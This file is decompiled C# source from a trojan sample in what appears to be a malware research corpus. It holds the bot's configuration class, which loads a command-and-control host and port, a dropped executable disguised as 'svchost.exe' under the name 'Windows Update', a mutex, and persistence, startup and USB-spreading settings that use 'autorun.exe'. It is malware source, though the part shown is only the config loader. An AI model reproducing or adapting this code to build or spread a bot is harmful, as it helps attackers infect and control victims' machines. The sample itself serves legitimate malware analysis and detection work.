// Decompiled with JetBrains decompiler
// Type: Stub.c_Config
// Assembly: Bot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 85CBEE6D-9173-48CF-9DE2-C5D6EFA84893
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Fsysna.dosu-c8b1b84f43bfbe7a69a68cc22f61d7b748661a1fe24c157f43f282f251b83c42.exe

using System.Reflection;
using System.Resources;

namespace Stub
{
  internal class c_Config
  {
    public static string s_Host = "127.0.0.1";
    public static int i_Port = 3000;
    public static int i_Interval = 3000;
    public static string s_DropName = "svchost.exe";
    public static string s_InstallName = "Windows Update";
    public static string s_Version = "1.0.0.0";
    public static string s_ServerID = "Default";
    public static int i_InstallType = 0;
    public static string s_Mutex = "random_mutex";
    public static string s_Password = "Password";
    public static int i_Startup = 0;
    public static int i_Persistance = 0;
    public static int i_Spread_Enabled = 0;
    public static int i_Spread_USB = 0;
    public static string s_USBName = "autorun.exe";
    public static int i_USBInterval = 15000;
    public static string s_Status = "Idle...";

    public static void LoadConfigs()
    {
      try
      {
        ResourceManager resourceManager = new ResourceManager("res", Assembly.GetExecutingAssembly());
        c_Config.s_Host = resourceManager.GetString("Host");
        int.TryParse(resourceManager.GetString("Port"), out c_Config.i_Port);
        int.TryParse(resourceManager.GetString("Interval"), out c_Config.i_Interval);
        c_Config.s_Password = resourceManager.GetString("Password");
        c_Config.s_ServerID = resourceManager.GetString("Server-ID");
        c_Config.s_Mutex = resourceManager.GetString("Mutex");
        int.TryParse(resourceManager.GetString("Startup"), out c_Config.i_Startup);
        int.TryParse(resourceManager.GetString("Install-Type"), out c_Config.i_InstallType);
        int.TryParse(resourceManager.GetString("Persistance"), out c_Config.i_Persistance);
        int.TryParse(resourceManager.GetString("Spread"), out c_Config.i_Spread_Enabled);
        int.TryParse(resourceManager.GetString("SpreadUSB"), out c_Config.i_Spread_USB);
        if (c_Config.i_InstallType == 0)
        {
          c_Config.s_DropName = resourceManager.GetString("DropName");
          c_Config.s_InstallName = resourceManager.GetString("InstallName");
        }
        if (c_Config.i_Spread_USB != 1)
          return;
        c_Config.s_USBName = resourceManager.GetString("USBName");
        int.TryParse(resourceManager.GetString("USBInterval"), out c_Config.i_USBInterval);
      }
      catch
      {
      }
    }
  }
}
